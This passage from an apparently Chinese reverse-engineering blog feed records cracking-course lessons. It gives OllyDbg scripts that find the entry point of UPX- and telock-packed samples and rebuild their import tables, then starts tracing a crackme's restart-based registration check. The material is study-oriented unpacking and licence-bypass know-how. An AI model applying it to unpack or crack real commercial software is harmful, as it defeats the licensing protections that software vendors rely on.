Functions-&gt;脚本运行窗口(或插件-&gt;ODbgScript-&gt;脚本运行窗口)打开脚本运行窗口。</p><p>（1）右键-&gt;载入脚本，将写好的脚本打开调试脚本。</p><p>（2）右键-&gt;运行脚本，将写好的脚本打开直接运行，不调试。</p><p>编写OD脚本的工具：</p><p>脚本的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sti ;F7</span><br><span class="line">sto;F8</span><br><span class="line">bp 地址   ;F2</span><br><span class="line">run;F9</span><br><span class="line">esto;Shift+F9</span><br><span class="line">gmi eip,CODEBASE;获取代码段地址</span><br></pre></td></tr></table></figure><p>简单写一个脚本尝试一下，脚本通常为.txt和.osc格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti</span><br></pre></td></tr></table></figure><p>载入脚本后，会自动运行脚本的第1行，按Tab键执行脚本的下一行，按空格键直接运行脚本。</p><img src="/posts/4b9d65e0/%E8%BD%BD%E5%85%A5%E8%84%9A%E6%9C%AC.png" class="" title="载入脚本"><h1 id="2-UPX的大表哥"><a href="#2-UPX的大表哥" class="headerlink" title="2. UPX的大表哥"></a>2. UPX的大表哥</h1><p>用普通的方法(单步跟踪、ESP定律、两次内存镜像等)就能找到OEP，关键在于修复IAT。</p><ol><li><p>用importREC获取输入表，发现全都是无效函数，用跟踪级别1就可全部修复完。</p></li><li><p>编写OD脚本(这节课的重点)，OD脚本是基于汇编语言编写的。</p></li></ol><p>因为这个是UPX壳，有一个大跳转跳到OEP处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00457765  - E9 4266FCFF     jmp upx的大?0041DDAC</span><br></pre></td></tr></table></figure><p>编写到OEP的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bp 00457765;在jmp下断点</span><br><span class="line">run;F9运行至断点处</span><br><span class="line">sti;F7步入</span><br><span class="line">MSG &quot;OEP到了&quot;   ;弹窗提示OEP到了</span><br><span class="line">ret;退出脚本</span><br></pre></td></tr></table></figure><p>直接运行脚本</p><img src="/posts/4b9d65e0/%E8%84%9A%E6%9C%AC%E5%BC%B9%E7%AA%97.png" class="" title="脚本弹窗"><img src="/posts/4b9d65e0/%E8%84%9A%E6%9C%AC%E7%BB%93%E6%9D%9F.png" class="" title="脚本结束"><p>但这个脚本仅限于当前程序且无重定位(如果当前程序有重定位，取消它的重定位即可)。相对来说，ESP定律的脚本更通用。</p><p>ESP定律是利用堆栈平衡找OEP的手段，首先要执行一条压栈指令来改变栈。等以后再次读取这个栈内容的时候，就说明有栈平衡的迹象，很有可能是栈的恢复。一般来说，压缩壳只有一次恢复，然后就到OEP了，利用这个特性来找OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sti;执行pushad</span><br><span class="line">bphws esp,&quot;r&quot;;给esp下硬件断点</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>执行完3行脚本后运行到<code>00457758</code>。还没到达OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00457758    8D4424 80       lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">0045775C    6A 00           push 0x0</span><br><span class="line">0045775E    39C4            cmp esp,eax</span><br><span class="line">00457760  ^ 75 FA           jnz short upx的大?0045775C</span><br><span class="line">00457762    83EC 80         sub esp,-0x80</span><br><span class="line">00457765  - E9 4266FCFF     jmp upx的大?0041DDAC</span><br></pre></td></tr></table></figure><p>再改进一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sti;执行pushad</span><br><span class="line">bphws esp,&quot;r&quot;;给esp下硬件断点</span><br><span class="line">run</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti;到了jnz</span><br><span class="line">bp eip</span><br><span class="line">@LOOP:</span><br><span class="line">run</span><br><span class="line">cmp esp,eax</span><br><span class="line">jnz @LOOP</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti;到OEP</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>UPX的壳段代码是差不多的，这个脚本可以用来找这个UPX版本所有加壳程序的OEP，而且允许程序有重定位。</p><p>到OEP的下一步是找IAT，除了一些特别变态的加密壳比如：Themida，SE，VMProtect，都可以找指令为<code>call dword...</code>(FF 15)，<code>jmp dword...</code>(FF 25)来找IAT。</p><img src="/posts/4b9d65e0/%E6%89%BEIAT.png" class="" title="找IAT"><p>发现注释是空的，在反汇编窗口的那条指令跟进去，<code>push API函数地址</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401077    FF15 28204300   call dword ptr ds:[0x432028]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0096033C    68 88401877     push comctl32.InitCommonControlsEx</span><br><span class="line">00960341    C3              retn</span><br></pre></td></tr></table></figure><p>这两条指令相当于<code>jmp InitCommonControlsEx</code>。很明显，把API函数调用改成自己的函数，然后在自己的函数里跳到真实的API地址。</p><p>一般来说，间接调用API函数有两种方法：</p><ul><li>在指令二进制，直接带有地址(push)</li><li>根据当前的eip加上指令中的偏移算出地址(jmp)</li></ul><p>虽然它注释是空的，但可以知道IAT的起始位置前面全是空数据，IAT结束时是与用户函数分隔。可以推测IAT起始地址为<code>432000</code>，结束地址为<code>432554</code>。</p><p>继续改进脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mov iat_b,00432000</span><br><span class="line">mov iat_e,00432554</span><br><span class="line">sti;执行pushad</span><br><span class="line">bphws esp,&quot;r&quot;;给esp下硬件断点</span><br><span class="line">run</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti;到了jnz</span><br><span class="line">bp eip</span><br><span class="line">@LOOP:</span><br><span class="line">run</span><br><span class="line">cmp esp,eax</span><br><span class="line">jnz @LOOP</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti;到OEP</span><br><span class="line">@IAT_LOOP:</span><br><span class="line">mov iat,[iat_b];比如iat=[432000]</span><br><span class="line">cmp iat,0;修改不了空数据，所以要跳过</span><br><span class="line">je @NEXT_LOOP</span><br><span class="line">mov api,[iat+1];比如api=[[432000]+1]=[68 88401877+1]=88401877</span><br><span class="line">mov [iat_b],api;重建iat</span><br><span class="line">@NEXT_LOOP:</span><br><span class="line">add iat_b,4</span><br><span class="line">cmp iat_b,iat_e</span><br><span class="line">jne @IAT_LOOP</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>运行完脚本再dump下来完成脱壳。</p><p>如果修改一个就不用脚本这么麻烦，双击下面这条指令复制API函数地址，去到对应的数据窗口地址修改其数值，右键-&gt;修改，粘贴API函数地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0096033C    68 88401877     push comctl32.InitCommonControlsEx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00432028  0096033C</span><br><span class="line">修改为</span><br><span class="line">00432028  77184088  comctl32.InitCommonControlsEx</span><br></pre></td></tr></table></figure><p>此时就可看到API函数了。</p><h1 id="3-真假难辨"><a href="#3-真假难辨" class="headerlink" title="3. 真假难辨"></a>3. 真假难辨</h1><p>用单步跟踪、两次内存镜像等都能找到OEP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00446021  /.  55            push ebp                                 ;  OEP</span><br><span class="line">00446022  |.  8BEC          mov ebp,esp</span><br><span class="line">00446024  |.  6A FF         push -0x1</span><br><span class="line">00446026  |.  68 70C04600   push 真假难辩.0046C070</span><br><span class="line">0044602B  |.  68 5CA84400   push 真假难辩.0044A85C                       ;  SE 处理程序安装</span><br><span class="line">00446030  |.  64:A1 0000000&gt;mov eax,dword ptr fs:[0]</span><br></pre></td></tr></table></figure><p>不会找IAT啊…不会写OD脚本…</p><h1 id="4-课后作业"><a href="#4-课后作业" class="headerlink" title="4. 课后作业"></a>4. 课后作业</h1><p>查壳是telock的壳，用最后一次异常法到达OEP，不会去第一课找telock壳详解。也可以三次内存镜像<code>.text</code>-&gt;<code>.rdata</code>-&gt;<code>.text</code>直达OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0045D4F6    55              push ebp</span><br><span class="line">0045D4F7    8BEC            mov ebp,esp</span><br><span class="line">0045D4F9    6A FF           push -0x1</span><br><span class="line">0045D4FB    68 28704800     push 第八九课.00487028</span><br><span class="line">0045D500    68 D4024600     push 第八九课.004602D4</span><br></pre></td></tr></table></figure><p>方法一：重建IAT用插件跟踪，剩余4无效指针，直接剪切。程序正常运行。</p><p>方法二：用OD脚本修复IAT，起始位置为<code>47D000</code>，结束位置为<code>47D6A0</code>。</p><p>下面这个脚本很容易看得懂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">;到达OEP才能用这个脚本</span><br><span class="line">mov iat_s, 0047d024</span><br><span class="line">mov iat_e, 0047d16c</span><br><span class="line">@LOOP1:</span><br><span class="line">mov iat,iat_s+663CFE</span><br><span class="line">mov [iat_s],[iat]</span><br><span class="line">add iat_s,4</span><br><span class="line">cmp iat_s,iat_e</span><br><span class="line">jne @LOOP1</span><br><span class="line"> </span><br><span class="line">mov iat_s,0047d16c</span><br><span class="line">mov iat_e,0047D374</span><br><span class="line">@LOOP2:</span><br><span class="line">mov iat,iat_s+644310</span><br><span class="line">mov [iat_s],[iat]</span><br><span class="line">add iat_s,4</span><br><span class="line">cmp iat_s,iat_e</span><br><span class="line">jne @LOOP2</span><br><span class="line"> </span><br><span class="line">mov iat_s,0047D384</span><br><span class="line">mov iat_e,0047D390</span><br><span class="line">@LOOP3:</span><br><span class="line">mov iat,iat_s+6A2CCE</span><br><span class="line">mov [iat_s],[iat]</span><br><span class="line">add iat_s,4</span><br><span class="line">cmp iat_s,iat_e</span><br><span class="line">jne @LOOP3</span><br><span class="line"> </span><br><span class="line">mov iat_s,0047D390</span><br><span class="line">mov iat_e,0047D600</span><br><span class="line">@LOOP4:</span><br><span class="line">mov iat,iat_s+654543</span><br><span class="line">mov [iat_s],[iat]</span><br><span class="line">add iat_s,4</span><br><span class="line">cmp iat_s,iat_e</span><br><span class="line">jne @LOOP4</span><br><span class="line"></span><br><span class="line">MSG &quot;IAT修复完成！&quot;</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>拿@LOOP1来说，<code>0047d024</code>的数值为<code>00AE0000</code>，Alt+M进入找地址为<code>00AE0000</code>的数据段，开头是一大段杂乱的数据，后面是空数据，紧接着又一段有规律的数据，再接着空数据。这段有规律的数据都是以<code>77</code>开头的，猜测是dll领空的API函数地址。 而<code>0047d024</code>与<code>00AE0D22</code>相差<code>663CFE</code>，所以要加上偏移<code>663CFE</code>即可得到API函数地址。@LOOP2到@LOOP4都同理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00AE0D20   00 00 C0 6D F0 77 56 D2 EF 77 1D AF EF 77 FF 82  ..續饂V绎ww</span><br><span class="line">00AE0D30   EF 77 17 6D F2 77 F1 7C EF 77 74 78 EF 77 D9 B4  飛m騱駖飛tx飛俅</span><br><span class="line">00AE0D40   EF 77 71 5A EF 77 6D E4 EF 77 EF 61 EF 77 E0 5F  飛qZ飛m滹w颽飛郷</span><br><span class="line">00AE0D50   EF 77 70 5B EF 77 79 6F EF 77 3D 99 EF 77 BE 99  飛p[飛yo飛=欙w緳</span><br><span class="line">00AE0D60   EF 77 18 89 EF 77 1A E8 EF 77 A0 C7 F1 77 BB 9D  飛夛w栾w犌駑粷</span><br><span class="line">00AE0D70   EF 77 86 77 EF 77 77 DE EF 77 0F 84 EF 77 78 ED  飛唚飛w揎w勶wx</span><br><span class="line">00AE0D80   EF 77 A5 61 EF 77 C1 61 EF 77 2A EB EF 77 D1 86  飛飛羇飛*腼w褑</span><br><span class="line">00AE0D90   EF 77 41 9D EF 77 EE BB EF 77 F3 D7 EF 77 83 9A  飛A濓w罨飛笞飛儦</span><br><span class="line">00AE0DA0   EF 77 15 90 EF 77 B8 D9 F1 77 3A 71 F0 77 3D 8D  飛愶w纲駑:q饂=</span><br><span class="line">00AE0DB0   EF 77 0A 70 EF 77 31 DB F0 77 6E F3 F0 77 D2 34  飛.p飛1垧wn箴w?</span><br><span class="line">00AE0DC0   F0 77 5A 3F F2 77 5E EA EF 77 84 8E EF 77 65 34  饂Z?騱^觑w剮飛e4</span><br><span class="line">00AE0DD0   F0 77 D8 8E EF 77 C1 DD F0 77 60 BE EF 77 F2 4E  饂貛飛凛饂`撅w騈</span><br><span class="line">00AE0DE0   F2 77 38 67 F2 77 D8 D3 F0 77 58 D3 F0 77 5F 6E  騱8g騱赜饂X羽w_n</span><br><span class="line">00AE0DF0   EF 77 60 83 EF 77 23 D3 EF 77 FA 6B EF 77 A0 7A  飛`冿w#语w鷎飛爖</span><br><span class="line">00AE0E00   EF 77 D6 6A EF 77 D1 AB EF 77 D3 B8 EF 77 36 86  飛謏飛勋飛痈飛6</span><br><span class="line">00AE0E10   EF 77 7A D8 EF 77 D7 D8 F1 77 E3 71 F0 77 81 BE  飛z仫w棕駑鉸饂伨</span><br><span class="line">00AE0E20   EF 77 4C 7B EF 77 BE 95 EF 77 2C D7 EF 77 77 06  飛L&#123;飛緯飛,罪ww</span><br><span class="line">00AE0E30   F0 77 DB 5E EF 77 01 7C EF 77 79 7C EF 77 BA 92  饂踍飛|飛y|飛簰</span><br><span class="line">00AE0E40   EF 77 B7 E8 EF 77 29 5E EF 77 EA C3 F0 77 89 63  飛疯飛)^飛昝饂塩</span><br><span class="line">00AE0E50   F2 77 40 97 EF 77 06 98 EF 77 77 5D EF 77 A1 6A  騱@楋w橈ww]飛</span><br><span class="line">00AE0E60   EF 77 A1 DD EF 77 2D A4 EF 77 00 00 00 00 00 00  飛≥飛-わw......</span><br><span class="line">00AE0E70   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure><p>用最后一次异常法到OEP和修复IAT，来自论坛苏紫方璇的脚本：(高级，看不懂就是了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">var iat_b         ;iat起始位置</span><br><span class="line">var iat_e         ;iat结束位置</span><br><span class="line">var tmp           ;临时中转</span><br><span class="line">var string        ;储存代码段自动跟踪命令</span><br><span class="line">var oldesp        ;esp备份</span><br><span class="line">var oldeip        ;eip备份</span><br><span class="line">var codebegin     ;代码段起始地址</span><br><span class="line">var codesize      ;代码段大小</span><br><span class="line"> </span><br><span class="line">gmi eip,CODEBASE             ;获取代码段地址</span><br><span class="line">mov codebegin,$RESULT</span><br><span class="line">gmi eip,CODESIZE             ;获取代码段大小</span><br><span class="line">mov codesize,$RESULT</span><br><span class="line">add codebegin,codesize       ;得到末尾地址</span><br><span class="line">mov string,&quot;eip &lt; &quot;          ;构建自动跟踪指令</span><br><span class="line">add string,codebegin</span><br><span class="line">msg &quot;请取消所有的忽略异常&quot;;StrongOD中的skip some exceptions要勾选</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO</span><br><span class="line">ESTO                      ;最后一次异常法</span><br><span class="line">bphws [esp+4],&quot;x&quot;         ;Seh地址下硬件断点</span><br><span class="line">ESTO                      ;Shift+F9</span><br><span class="line">bphwcall                  ;清除所有硬件断点</span><br><span class="line">TICND string              ;TICND &quot;eip &lt; 47d000&quot;       ;tc eip&lt;47d000</span><br><span class="line">cmt eip,&quot;程序入口点&quot;</span><br><span class="line">msg &quot;找到入口点&quot;</span><br><span class="line">;IAT修复</span><br><span class="line">mov iat_b,0047D000</span><br><span class="line">mov iat_e,0047D6A0</span><br><span class="line">mov oldesp,esp           ;备份esp，eip</span><br><span class="line">mov oldeip,eip</span><br><span class="line">@ILoop:</span><br><span class="line">mov tmp,[iat_b]          ;tmp=原始iat表值</span><br><span class="line">cmp tmp,10000000</span><br><span class="line">ja @Next                 ;若大于10000000就换下一个</span><br><span class="line">cmp tmp,00400000</span><br><span class="line">ja @Start                ;若大于00400000就继续运行</span><br><span class="line">cmp tmp,0</span><br><span class="line">jz @Next                 ;等于0就换下一个</span><br><span class="line">@Start:</span><br><span class="line">mov eip,tmp          ;设定eip</span><br><span class="line">mov esp,oldesp       ;恢复esp</span><br><span class="line">rtr                   ;运行到返回</span><br><span class="line">mov [iat_b],[esp]      ;修复IAT</span><br><span class="line">@Next:</span><br><span class="line">add iat_b,4           ;下一个iat</span><br><span class="line">cmp iat_b,iat_e       ;判断是否结束</span><br><span class="line">jnz @ILoop</span><br><span class="line">mov eip,oldeip        ;恢复eip，esp</span><br><span class="line">mov esp,oldesp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在做第五六课的打补丁作业时，遇到了在不脱壳的情况下修改程序。在复制到可执行文件时提示“无法定位数据”。这是因为程序加壳后，代码段显示全是空代码，我们修改代码时，系统执行将某代码1修改为某代码2，但系统在代码段找不到某代码1，所以提示“无法定位数据”。&lt;/p&gt;
&lt;p&gt;但如果我们将程序脱壳了，就可在程序上随意修改，所以脱壳的重要性就体现出来了。脱壳毁一生，破解穷三代(bushi)。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第五六课——解除程序重启验证，程序打补丁</title>
    <link href="http://example.com/posts/bb44dc0.html"/>
    <id>http://example.com/posts/bb44dc0.html</id>
    <published>2022-04-05T01:29:28.122Z</published>
    <updated>2022-04-11T05:26:08.364Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-课前预习"><a href="#1-课前预习" class="headerlink" title="1. 课前预习"></a>1. 课前预习</h1><ul><li><p>熟悉OD字符串插件的使用<br>右键或插件-&gt;中文搜索引擎-&gt;智能搜索，Ctrl+F搜索字符串。</p></li><li><p>熟悉OD如何下断点<br>Ctrl+G，直接搜索API下断<br>Ctrl+N，输入表搜索API-&gt;右键-&gt;在每个参考上设置断点<br>利用插件，ApiBreak和API断点设置工具都可以</p></li></ul><span id="more"></span><ul><li><p>熟悉procmon的使用<br>可以监控文件，注册表，网络，进线程信息<br>排除进程:Exclude<br>查看指定进程:Include</p></li><li><p>熟悉文件操作API的使用<br>CreateFileA(W):创建文件<br>ReadFile:读取文件<br>WriteFile:写入文件<br>CloseHandle:关闭句柄<br>读取文件:CreateFile-&gt;ReadFile-&gt;CloseHandle<br>写入文件:CreateFile-&gt;WriteFile-&gt;CloseHandle</p></li><li><p>熟悉注册表操作API的使用<br>创建注册表Key:RegCreateKey<br>打开注册表Key:RegOpenKey<br>查询注册表键值:RegQueryValueExA<br>写入注册表键值:RegSetValueEx</p></li></ul><h1 id="2-重启验证"><a href="#2-重启验证" class="headerlink" title="2. 重启验证"></a>2. 重启验证</h1><p>什么是重启验证</p><ul><li>重启验证顾名思义就是在程序启动时验证注册信息。 </li></ul><p>执行流程</p><ul><li><p>基本的执行流程：注册信息输入—&gt;程序重启—&gt;执行验证机制—&gt;正常执行</p></li><li><p>扩展的执行流程：注册信息输入—&gt;执行部分验证机制/执行假验证机制—&gt;程序重启—&gt;执行真验证机制—&gt;正常执行</p></li><li>对于有经验的作者来说，可以在注册信息输入和程序重启之间加入假的验证机制，假的验证机制一般比较简单，比如说只是当单纯的明码比较，当我们输入假的注册码，程序一般会提示注册成功，此时程序就会知道我们是逆向者，在程序重启时就会假装注册成功，在执行程序功能时就会报错或是无反应，这就是所谓的暗桩。</li></ul><p>重启验证的类型</p><ul><li>重启验证根据写入信息位置的不同一般分两类，一类是将注册信息写入文件中，一类是将注册信息写入注册表中。</li></ul><p>定位关键代码</p><ol><li>字符串定位<br>通过OD字符串插件扫描敏感字符串，一般出现的文件路径或是注册表路径都可能是验证信息的保存位置</li><li>监控工具定位<br>通过procmon等监控工具监控注册信息的写入位置</li><li>API定位<br>通过定位CreateFile，RegCreateKey，GetPrivateProfileStringA等API来获取注册信息的写入位置</li></ol><h1 id="3-重启验证示例"><a href="#3-重启验证示例" class="headerlink" title="3. 重启验证示例"></a>3. 重启验证示例</h1><p>运行一下程序查看它的操作机制。</p><img src="/posts/bb44dc0/%E7%A4%BA%E4%BE%8B.png" class="" title="示例"><p>输入任意字符串，点击重启验证1，出现弹窗，在程序的本目录下生成一个.txt文件，程序退出。里面是我们输入的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">888888888</span><br></pre></td></tr></table></figure><p>再次，点击重启验证2，出现弹窗，在程序的本目录下生成一个.ini文件，程序退出。里面是我们输入的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[验证]</span><br><span class="line">Key=888888888</span><br></pre></td></tr></table></figure><p>再次，点击重启验证3，出现弹窗，在本机注册表里写入信息，程序退出。徽标键+R打开运行窗口，输入<code>regedit</code>打开注册表，在下图看到输入的字符串。</p><img src="/posts/bb44dc0/%E6%B3%A8%E5%86%8C%E8%A1%A8.png" class="" title="注册表"><p>将所有生成的文件和注册表信息删除，载入OD，搜索敏感字符串。</p><img src="/posts/bb44dc0/%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6%E4%B8%B2.png" class="" title="搜索字符串"><p>首先看重启验证1，双击进入反汇编代码，找到函数开头下断。运行，输入假码，选择重启验证1，OD停在断点处。F8往下走走，遇到call先用enter探探路再考虑是否跟进去。这个call里面有很多API函数，程序经过这条指令后，eax变成我们输入的字符串，所以这个函数是取出输入框里的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040275B  |.  E8 C8590100   call 52PoJie?00418128;eax=888888888</span><br><span class="line">00402760  |.  8B45 EC             mov eax,[local.5]</span><br><span class="line">00402763  |.  8378 F4 00          cmp dword ptr ds:[eax-0xC],0x0;判断字符串是否为空</span><br><span class="line">00402767  |.  74 74               je short 52PoJie?004027DD</span><br></pre></td></tr></table></figure><p>继续F8，到<code>CreateFileA</code>函数，创建一个52Pojie.txt文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00402769  |.  6A 00               push 0x0                                     ; /hTemplateFile = NULL</span><br><span class="line">0040276B  |.  6A 00               push 0x0                                     ; |Attributes = 0</span><br><span class="line">0040276D  |.  6A 02               push 0x2                                     ; |Mode = CREATE_ALWAYS</span><br><span class="line">0040276F  |.  6A 00               push 0x0                                     ; |pSecurity = NULL</span><br><span class="line">00402771  |.  6A 01               push 0x1                                     ; |ShareMode = FILE_SHARE_READ</span><br><span class="line">00402773  |.  68 00000040         push 0x40000000                              ; |Access = GENERIC_WRITE</span><br><span class="line">00402778  |.  FFB6 BC000000       push dword ptr ds:[esi+0xBC]                 ; |FileName = &quot;C:\Documents and Settings\Administrator\桌面\吾爱破解培训第五课例子\52Pojie.txt&quot;</span><br><span class="line">0040277E  |.  FF15 10345400       call dword ptr ds:[&lt;&amp;KERNEL32.CreateFileA&gt;]  ; \CreateFileA</span><br></pre></td></tr></table></figure><p>F8到<code>WriteFileA</code>函数，将我们输入的字符串写入52Pojie.txt文件中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">004027AD  |&gt; \6A 00               push 0x0                                     ; /pOverlapped = NULL</span><br><span class="line">004027AF  |.  8D45 E8             lea eax,[local.6]                            ; |</span><br><span class="line">004027B2  |.  50                  push eax                                     ; |pBytesWritten = 00000009</span><br><span class="line">004027B3  |.  57                  push edi                                     ; |nBytesToWrite = 0x9</span><br><span class="line">004027B4  |.  51                  push ecx                                     ; |Buffer = 00161100</span><br><span class="line">004027B5  |.  56                  push esi                                     ; |hFile = 000000D4 (window)</span><br><span class="line">004027B6  |.  FF15 2C345400       call dword ptr ds:[&lt;&amp;KERNEL32.WriteFile&gt;]    ; \WriteFile</span><br></pre></td></tr></table></figure><p>继续F8，<code>004027C9</code>执行弹窗，退出，关闭句柄。再之后就退出程序了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 